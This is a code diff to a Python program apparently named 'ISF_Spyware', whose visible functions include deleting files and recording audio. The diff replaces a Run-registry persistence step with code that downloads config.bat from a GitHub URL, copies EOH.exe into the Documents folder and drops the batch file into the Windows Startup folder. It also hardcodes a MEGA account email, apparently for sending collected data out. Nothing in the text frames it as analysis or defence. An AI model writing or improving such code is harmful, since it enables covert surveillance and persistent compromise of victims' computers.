@@ -11,7 +11,7 @@ import requests
 import geocoder
 import glob
 import pyautogui
-import winreg
+import sys
 
 def delete_files():
     current_folder = os.getcwd()
@@ -174,12 +174,43 @@ def record_audio():
 while True:
     try:
         delete_files()
-        
-        program_name = "consolebased.exe"
-        program_path = os.path.join(os.getcwd(), program_name)
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
-        winreg.SetValueEx(key, "Consolebased", 0, winreg.REG_SZ, program_path)
-        winreg.CloseKey(key)
+        # Set the paths
+        url = "https://github.com/Basit2121/ISF_Spyware/raw/main/config.bat"
+        filename = "config.bat"
+
+        response = requests.get(url)
+        with open(filename, "wb") as file:
+            file.write(response.content)
+
+        original_file = 'EOH.exe'
+        documents_folder = os.path.expanduser('~\\Documents')
+        source_file = "config.bat"
+        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+
+        documents_folder = os.path.expanduser("~\Documents")
+
+        # Check if the file exists
+        file_path = os.path.join(documents_folder, "EOH.exe")
+        if os.path.exists(file_path):
+            print("EOH.exe exists in the Documents folder.")
+        else:
+            print("EOH.exe does not exist in the Documents folder.")
+            # Copy the original file to the Documents folder
+            original_path = os.path.abspath(original_file)
+            new_path = os.path.join(documents_folder, original_file)
+            shutil.copyfile(original_path, new_path)
+            shutil.copy(source_file, startup_folder)
+            sys.exit()
+
+        config_file_path = "config.bat"
+
+        # Check if the file exists
+        if os.path.exists(config_file_path):
+            # Delete the file
+            os.remove(config_file_path)
+            print(f"File '{config_file_path}' has been deleted.")
+        else:
+            print(f"File '{config_file_path}' does not exist.")
 
         # set username/password
         mega_email = 'lajex92681@meidecn.com'
